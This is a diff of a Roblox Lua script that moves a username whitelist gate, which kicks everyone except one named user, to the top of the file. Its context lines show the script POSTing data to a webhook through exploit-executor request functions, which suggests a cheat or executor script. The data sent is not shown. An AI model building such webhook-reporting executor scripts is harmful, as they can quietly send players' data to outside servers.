@@ -1,3 +1,28 @@
+-- Whitelist for specific usernames 
+local whitelistedUsers = {
+   "XxmanticoreYT",  --whitelisted u can and more
+
+}
+
+-- Function to check if player is whitelisted
+local function isWhitelisted(username)
+   for _, whitelisted in ipairs(whitelistedUsers) do
+       if username == whitelisted then
+           return true
+       end
+   end
+   return false
+end
+
+-- Get the local player's username
+local player = game.Players.LocalPlayer
+local username = player.Name
+
+-- Kick the player if they are not whitelisted
+if not isWhitelisted(username) then
+   game.Players.LocalPlayer:Kick("Not WhiteListed L")
+   return
+else
 
 
 
@@ -48,32 +73,6 @@ elseif http_request then
 elseif syn and syn.request then
     syn.request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
 end
-
--- Whitelist for specific usernames 
-local whitelistedUsers = {
-   "XxmanticoreYT",  --whitelisted u can and more
-
-}
-
--- Function to check if player is whitelisted
-local function isWhitelisted(username)
-   for _, whitelisted in ipairs(whitelistedUsers) do
-       if username == whitelisted then
-           return true
-       end
-   end
-   return false
-end
-
--- Get the local player's username
-local player = game.Players.LocalPlayer
-local username = player.Name
-
--- Kick the player if they are not whitelisted
-if not isWhitelisted(username) then
-   game.Players.LocalPlayer:Kick("Not WhiteListed L")
-   return
-else
 
 
 
